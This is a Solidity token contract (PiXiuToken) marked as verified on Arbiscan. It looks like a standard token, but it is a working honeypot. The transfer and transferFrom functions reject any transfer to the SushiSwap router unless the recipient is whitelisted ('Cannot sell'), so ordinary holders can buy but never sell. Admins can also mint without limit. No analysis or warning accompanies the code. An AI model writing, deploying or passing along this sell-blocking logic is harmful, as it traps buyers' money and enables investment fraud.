/**
 *Submitted for verification at Arbiscan.io on 2024-06-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PiXiuToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;

    address public owner;
    address public sushiRouter;
    
    mapping(address => bool) private _whitelist;
    mapping(address => bool) private _admins;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    modifier onlyAdmin() {
        require(_admins[msg.sender], "Only admin can call this function");
        _;
    }

    constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _initialSupply, address _router) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _initialSupply * 10**uint(_decimals);
        
        owner = msg.sender;
        sushiRouter = _router;
        
        balances[msg.sender] = totalSupply;
        
        _whitelist[msg.sender] = true;
        _admins[msg.sender] = true;
    }
    
    function addToWhitelist(address _address) public onlyAdmin {
        _whitelist[_address] = true;
    }

    function removeFromWhitelist(address _address) public onlyAdmin {
        _whitelist[_address] = false;
    }

    function isWhitelisted(address _address) public view returns (bool) {
        return _whitelist[_address];
    }
    
    function isAdmin(address _address) public view returns (bool) {
        return _admins[_address];
    }
    
    function addAdmin(address _admin) public onlyOwner {
        _admins[_admin] = true;
    }

    function removeAdmin(address _admin) public onlyOwner {
        _admins[_admin] = false;
    }

    function mint(address to, uint256 amount) public onlyAdmin {
        require(to != address(0), "Invalid address");
        require(totalSupply + amount >= totalSupply && balances[to] + amount >= balances[to]); // overflow check
        totalSupply += amount;
        balances[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0), "Invalid address");
        require(_value <= balances[msg.sender], "Insufficient balance");
        require(_whitelist[_to] || _to != sushiRouter, "Cannot sell"); // only allow whitelisted addresses or prevent from selling to SushiRouter
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_from != address(0) && _to != address(0), "Invalid address");
        require(_value <= balances[_from], "Insufficient balance");
        require(_value <= allowed[_from][msg.sender], "Allowance exceeded");
        require(_whitelist[_to] || _to != sushiRouter, "Cannot sell"); // only allow whitelisted addresses or prevent from selling to SushiRouter
        balances[_from] -= _value;
        balances[_to] += _value;
        allowed[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        require(_spender != address(0), "Invalid address");
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }
}